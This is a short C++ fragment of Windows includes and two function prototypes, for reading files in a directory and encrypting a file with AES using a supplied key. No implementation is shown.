#include <iostream>
#include <windows.h>
#include <string>
#include <vector>

#define UNLEN 512

using namespace std;

void FileRead(unsigned char* key, string& dirName);

void EncryptFileByAES(unsigned char* key, string& dirName, string& fileName);


